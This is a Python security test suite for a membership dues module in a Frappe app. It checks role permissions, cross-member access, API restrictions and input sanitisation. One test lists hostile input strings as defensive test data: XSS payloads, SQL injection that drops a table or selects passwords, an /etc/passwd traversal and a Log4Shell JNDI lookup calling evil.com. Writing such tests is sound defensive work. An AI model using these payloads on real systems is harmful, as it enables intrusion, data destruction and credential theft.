# -*- coding: utf-8 -*-
"""
Security validation tests for the membership dues system
Tests permission controls, data access restrictions, and security boundaries
"""

import frappe
from frappe.utils import today, add_months, add_days, flt, getdate, now_datetime
from verenigingen.tests.utils.base import VereningingenTestCase
from frappe.exceptions import PermissionError, ValidationError


class TestMembershipDuesSecurityValidation(VereningingenTestCase):
    """Test security aspects of the membership dues system"""

    def setUp(self):
        super().setUp()
        self.security_test_prefix = f"sec_{frappe.generate_hash(length=6)}"
        
        # Create test users with different roles
        self.admin_user = self.create_test_user(
            f"admin.{self.security_test_prefix}@example.com",
            roles=["System Manager", "Verenigingen Administrator"]
        )
        
        self.member_user = self.create_test_user(
            f"member.{self.security_test_prefix}@example.com", 
            roles=["Member"]
        )
        
        self.volunteer_user = self.create_test_user(
            f"volunteer.{self.security_test_prefix}@example.com",
            roles=["Volunteer"]
        )
        
        self.guest_user = self.create_test_user(
            f"guest.{self.security_test_prefix}@example.com",
            roles=["Guest"]
        )
        
    # Permission Control Tests
    
    def test_dues_schedule_creation_permissions(self):
        """Test who can create dues schedules"""
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        test_membership = self.create_security_test_membership(test_member, membership_type)
        
        # Admin should be able to create dues schedules
        with self.as_user(self.admin_user.name):
            admin_schedule = frappe.new_doc("Membership Dues Schedule")
            admin_schedule.member = test_member.name
            admin_schedule.membership = test_membership.name
            admin_schedule.membership_type = membership_type.name
            admin_schedule.contribution_mode = "Calculator"
            admin_schedule.dues_rate = 25.0
            admin_schedule.billing_frequency = "Monthly"
            admin_schedule.status = "Active"
            admin_schedule.auto_generate = 0
            
            # Should succeed
            admin_schedule.save()
            self.track_doc("Membership Dues Schedule", admin_schedule.name)
            
        # Regular member should NOT be able to create dues schedules for others
        with self.as_user(self.member_user.name):
            member_schedule = frappe.new_doc("Membership Dues Schedule")
            member_schedule.member = test_member.name
            member_schedule.membership = test_membership.name
            member_schedule.membership_type = membership_type.name
            member_schedule.contribution_mode = "Calculator"
            member_schedule.dues_rate = 25.0
            member_schedule.billing_frequency = "Monthly"
            member_schedule.status = "Active"
            member_schedule.auto_generate = 0
            
            # Should fail with permission error
            with self.assertRaises(frappe.PermissionError):
                member_schedule.save()
                
        # Guest should definitely not be able to create dues schedules
        with self.as_user(self.guest_user.name):
            guest_schedule = frappe.new_doc("Membership Dues Schedule")
            guest_schedule.member = test_member.name
            guest_schedule.membership = test_membership.name
            guest_schedule.membership_type = membership_type.name
            guest_schedule.contribution_mode = "Calculator"
            guest_schedule.dues_rate = 25.0
            guest_schedule.billing_frequency = "Monthly"
            guest_schedule.status = "Active"
            guest_schedule.auto_generate = 0
            
            with self.assertRaises(frappe.PermissionError):
                guest_schedule.save()
                
    def test_dues_schedule_modification_permissions(self):
        """Test who can modify existing dues schedules"""
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        test_membership = self.create_security_test_membership(test_member, membership_type)
        
        # Create a dues schedule as admin
        with self.as_user(self.admin_user.name):
            dues_schedule = frappe.new_doc("Membership Dues Schedule")
            dues_schedule.member = test_member.name
            dues_schedule.membership = test_membership.name
            dues_schedule.membership_type = membership_type.name
            dues_schedule.contribution_mode = "Calculator"
            dues_schedule.dues_rate = 25.0
            dues_schedule.billing_frequency = "Monthly"
            dues_schedule.status = "Active"
            dues_schedule.auto_generate = 0
            dues_schedule.save()
            self.track_doc("Membership Dues Schedule", dues_schedule.name)
            schedule_name = dues_schedule.name
            
        # Admin should be able to modify
        with self.as_user(self.admin_user.name):
            admin_schedule = frappe.get_doc("Membership Dues Schedule", schedule_name)
            admin_schedule.dues_rate = 30.0
            admin_schedule.save()  # Should succeed
            
        # Member should NOT be able to modify
        with self.as_user(self.member_user.name):
            with self.assertRaises(frappe.PermissionError):
                member_schedule = frappe.get_doc("Membership Dues Schedule", schedule_name)
                member_schedule.dues_rate = 35.0
                member_schedule.save()
                
    def test_sensitive_field_access_control(self):
        """Test access control for sensitive fields"""
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        test_membership = self.create_security_test_membership(test_member, membership_type)
        
        # Create dues schedule with custom amount (sensitive)
        with self.as_user(self.admin_user.name):
            dues_schedule = frappe.new_doc("Membership Dues Schedule")
            dues_schedule.member = test_member.name
            dues_schedule.membership = test_membership.name
            dues_schedule.membership_type = membership_type.name
            dues_schedule.contribution_mode = "Custom"
            dues_schedule.dues_rate = 10.0  # Below normal rate
            dues_schedule.uses_custom_amount = 1
            dues_schedule.custom_amount_reason = "Financial hardship - CONFIDENTIAL"
            dues_schedule.billing_frequency = "Monthly"
            dues_schedule.status = "Active"
            dues_schedule.auto_generate = 0
            dues_schedule.save()
            self.track_doc("Membership Dues Schedule", dues_schedule.name)
            schedule_name = dues_schedule.name
            
        # Test field visibility for different user types
        test_users = [
            (self.admin_user.name, True, "Admin should see sensitive fields"),
            (self.member_user.name, False, "Member should not see sensitive fields"),
            (self.guest_user.name, False, "Guest should not see sensitive fields")
        ]
        
        for user_email, should_access, message in test_users:
            with self.as_user(user_email):
                try:
                    # Try to read the document
                    schedule = frappe.get_doc("Membership Dues Schedule", schedule_name)
                    
                    if should_access:
                        # Admin should see all fields
                        self.assertEqual(schedule.custom_amount_reason, "Financial hardship - CONFIDENTIAL")
                    else:
                        # Non-admin users should not have access to read the document at all
                        self.fail(f"User {user_email} should not have read access to dues schedule")
                        
                except frappe.PermissionError:
                    if should_access:
                        self.fail(f"User {user_email} should have access but was denied")
                    # Expected for non-admin users
                    
    def test_cross_member_data_access_prevention(self):
        """Test that members cannot access other members' data"""
        membership_type = self.create_security_test_membership_type()
        
        # Create two separate members
        member1 = self.create_security_test_member("member1")
        member2 = self.create_security_test_member("member2")
        
        membership1 = self.create_security_test_membership(member1, membership_type)
        membership2 = self.create_security_test_membership(member2, membership_type)
        
        # Create dues schedules for both
        with self.as_user(self.admin_user.name):
            schedule1 = frappe.new_doc("Membership Dues Schedule")
            schedule1.member = member1.name
            schedule1.membership = membership1.name
            schedule1.membership_type = membership_type.name
            schedule1.contribution_mode = "Calculator"
            schedule1.amount = 25.0
            schedule1.billing_frequency = "Monthly"
            schedule1.status = "Active"
            schedule1.auto_generate = 0
            schedule1.save()
            self.track_doc("Membership Dues Schedule", schedule1.name)
            
            schedule2 = frappe.new_doc("Membership Dues Schedule")
            schedule2.member = member2.name
            schedule2.membership = membership2.name
            schedule2.membership_type = membership_type.name
            schedule2.contribution_mode = "Calculator"
            schedule2.amount = 50.0  # Different amount
            schedule2.billing_frequency = "Monthly"
            schedule2.status = "Active"
            schedule2.auto_generate = 0
            schedule2.save()
            self.track_doc("Membership Dues Schedule", schedule2.name)
            
        # Create user accounts linked to members
        member1_user = self.create_test_user(
            member1.email,
            roles=["Member"]
        )
        
        member2_user = self.create_test_user(
            member2.email,
            roles=["Member"]
        )
        
        # Member 1 should only see their own data
        with self.as_user(member1.email):
            # Should be able to access own member record
            try:
                own_member = frappe.get_doc("Member", member1.name)
                self.assertEqual(own_member.name, member1.name)
            except frappe.PermissionError:
                # Expected behavior if member access is restricted
                pass
                
            # Should NOT be able to access other member's record
            with self.assertRaises(frappe.PermissionError):
                other_member = frappe.get_doc("Member", member2.name)
                
            # Should NOT be able to see other member's dues schedule
            with self.assertRaises(frappe.PermissionError):
                other_schedule = frappe.get_doc("Membership Dues Schedule", schedule2.name)
                
    def test_api_endpoint_security(self):
        """Test security of API endpoints"""
        from verenigingen.api.enhanced_membership_application import get_membership_types_for_application
        from verenigingen.api.payment_plan_management import request_payment_plan
        
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        
        # Test public API endpoints (should work for authenticated users)
        test_users = [
            (self.admin_user.name, True, "Admin should access API"),
            (self.member_user.name, True, "Member should access public API"),
            (self.guest_user.name, False, "Guest should be restricted")
        ]
        
        for user_email, should_access, message in test_users:
            with self.as_user(user_email):
                try:
                    # Test public API
                    types = get_membership_types_for_application()
                    if should_access:
                        self.assertIsInstance(types, list, message)
                    else:
                        self.fail(f"Guest user should not have API access")
                        
                except frappe.PermissionError:
                    if should_access:
                        self.fail(f"User {user_email} should have API access")
                    # Expected for restricted users
                    
        # Test restricted API endpoints (payment plan requests)
        sensitive_test_users = [
            (self.admin_user.name, True, "Admin should access sensitive API"),
            (self.member_user.name, False, "Member should be restricted from sensitive API"),
            (self.guest_user.name, False, "Guest should be restricted from sensitive API")
        ]
        
        for user_email, should_access, message in sensitive_test_users:
            with self.as_user(user_email):
                try:
                    result = request_payment_plan(
                        member=test_member.name,
                        total_amount=100.0,
                        preferred_installments=4,
                        preferred_frequency="Monthly",
                        reason="Test payment plan request"
                    )
                    
                    if should_access:
                        self.assertTrue(result.get("success", False), message)
                    else:
                        # If it doesn't raise an error, it should at least fail
                        self.assertFalse(result.get("success", True), "Non-admin users should not succeed")
                        
                except frappe.PermissionError:
                    if should_access:
                        self.fail(f"User {user_email} should have access to sensitive API")
                    # Expected for restricted users
                    
    def test_input_validation_and_sanitization(self):
        """Test input validation and XSS/injection prevention"""
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        test_membership = self.create_security_test_membership(test_member, membership_type)
        
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE tabMember; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "<img src=x onerror=alert('XSS')>",
            "' UNION SELECT password FROM tabUser --"
        ]
        
        with self.as_user(self.admin_user.name):
            for malicious_input in malicious_inputs:
                # Test custom amount reason field
                dues_schedule = frappe.new_doc("Membership Dues Schedule")
                dues_schedule.member = test_member.name
                dues_schedule.membership = test_membership.name
                dues_schedule.membership_type = membership_type.name
                dues_schedule.contribution_mode = "Custom"
                dues_schedule.dues_rate = 25.0
                dues_schedule.uses_custom_amount = 1
                dues_schedule.custom_amount_reason = malicious_input
                dues_schedule.billing_frequency = "Monthly"
                dues_schedule.status = "Active"
                dues_schedule.auto_generate = 0
                
                try:
                    dues_schedule.save()
                    self.track_doc("Membership Dues Schedule", dues_schedule.name)
                    
                    # Verify input was sanitized (should not contain raw script tags)
                    saved_reason = dues_schedule.custom_amount_reason
                    self.assertNotIn("<script>", saved_reason, "Script tags should be sanitized")
                    self.assertNotIn("DROP TABLE", saved_reason, "SQL injection attempts should be sanitized")
                    
                except ValidationError:
                    # Input validation rejected the malicious input - good!
                    pass
                    
    def test_amount_manipulation_prevention(self):
        """Test prevention of unauthorized amount manipulation"""
        membership_type = self.create_security_test_membership_type()
        test_member = self.create_security_test_member()
        test_membership = self.create_security_test_membership(test_member, membership_type)
        
        with self.as_user(self.admin_user.name):
            dues_schedule = frappe.new_doc("Membership Dues Schedule")
            dues_schedule.member = test_member.name
            dues_schedule.membership = test_membership.name
            dues_schedule.membership_type = membership_type.name
            dues_schedule.contribution_mode = "Calculator"
            dues_schedule.dues_rate = 25.0
            dues_schedule.billing_frequency = "Monthly"
            dues_schedule.status = "Active"
            dues_schedule.auto_generate = 0
            dues_schedule.save()
            self.track_doc("Membership Dues Schedule", dues_schedule.name)
            schedule_name = dues_schedule.name
            
        # Test various amount manipulation attempts
        manipulation_tests = [
            (-100.0, "Negative amounts should be rejected"),
            (0.001, "Amounts below minimum should be rejected"),
            (999999.99, "Extremely large amounts should be validated"),
            ("invalid", "Non-numeric amounts should be rejected"),
            (None, "Null amounts should be rejected")
        ]
        
        with self.as_user(self.admin_user.name):
            for test_amount, test_description in manipulation_tests:
                schedule = frappe.get_doc("Membership Dues Schedule", schedule_name)
                original_amount = schedule.dues_rate
                
                try:
                    schedule.dues_rate = test_amount
                    schedule.save()
                    
                    # If save succeeded, verify the amount was properly validated
                    if isinstance(test_amount, (int, float)) and test_amount > 0:
                        # Valid positive number - check if it's within reasonable bounds
                        if test_amount < membership_type.minimum_contribution:
                            self.fail(f"Amount below minimum should be rejected: {test_description}")
                        elif test_amount > 10000:  # Arbitrary large amount threshold
                            self.fail(f"Extremely large amount should be validated: {test_description}")
                    else:
                        self.fail(f"Invalid amount should be rejected: {test_description}")
                        
                except (ValidationError, TypeError, ValueError):
                    # Expected for invalid inputs
                    pass
                finally:
                    # Restore original amount
                    schedule.reload()
                    if schedule.dues_rate != original_amount:
                        schedule.dues_rate = original_amount
                        schedule.save()
                        
    def test_bulk_operation_security(self):
        """Test security of bulk operations"""
        membership_type = self.create_security_test_membership_type()
        
        # Create multiple members
        members = []
        for i in range(5):
            member = self.create_security_test_member(f"bulk_{i}")
            members.append(member)
            
        # Admin should be able to perform bulk operations
        with self.as_user(self.admin_user.name):
            bulk_schedules = []
            
            for member in members:
                membership = self.create_security_test_membership(member, membership_type)
                
                schedule = frappe.new_doc("Membership Dues Schedule")
                schedule.member = member.name
                schedule.membership = membership.name
                schedule.membership_type = membership_type.name
                schedule.contribution_mode = "Calculator"
                schedule.dues_rate = 25.0
                schedule.billing_frequency = "Monthly"
                schedule.status = "Active"
                schedule.auto_generate = 0
                schedule.save()
                self.track_doc("Membership Dues Schedule", schedule.name)
                bulk_schedules.append(schedule)
                
            # Should succeed for admin
            self.assertEqual(len(bulk_schedules), 5)
            
        # Non-admin should NOT be able to perform bulk operations
        with self.as_user(self.member_user.name):
            failed_operations = 0
            
            for member in members:
                try:
                    # Attempt to create another schedule
                    schedule = frappe.new_doc("Membership Dues Schedule")
                    schedule.member = member.name
                    schedule.membership_type = membership_type.name
                    schedule.contribution_mode = "Calculator"
                    schedule.dues_rate = 25.0
                    schedule.billing_frequency = "Monthly"
                    schedule.status = "Active"
                    schedule.auto_generate = 0
                    schedule.save()
                    
                except frappe.PermissionError:
                    failed_operations += 1
                    
            # All operations should fail for non-admin user
            self.assertEqual(failed_operations, 5, "All bulk operations should fail for non-admin user")
            
    # Security Test Helper Methods
    
    def create_security_test_member(self, suffix=""):
        """Create a member for security testing"""
        member = frappe.new_doc("Member")
        member.first_name = f"Security{suffix}"
        member.last_name = f"Test{self.security_test_prefix}"
        member.email = f"security.{suffix}.{self.security_test_prefix}@example.com"
        member.member_since = today()
        member.address_line1 = f"{suffix} Security Street"
        member.postal_code = "9999AB"
        member.city = "Security City"
        member.country = "Netherlands"
        member.save()
        self.track_doc("Member", member.name)
        return member
        
    def create_security_test_membership(self, member, membership_type):
        """Create a membership for security testing"""
        membership = frappe.new_doc("Membership")
        membership.member = member.name
        membership.membership_type = membership_type.name
        membership.start_date = today()
        membership.status = "Active"
        membership.save()
        self.track_doc("Membership", membership.name)
        return membership
        
    def create_security_test_membership_type(self):
        """Create a membership type for security testing"""
        membership_type = frappe.new_doc("Membership Type")
        membership_type.membership_type_name = f"Security Test {self.security_test_prefix}"
        membership_type.description = "Membership type for security testing"
        membership_type.minimum_amount = 25.0
        membership_type.is_active = 1
        membership_type.contribution_mode = "Calculator"
        membership_type.enable_income_calculator = 1
        membership_type.income_percentage_rate = 0.75
        membership_type.save()
        self.track_doc("Membership Type", membership_type.name)
        return membership_type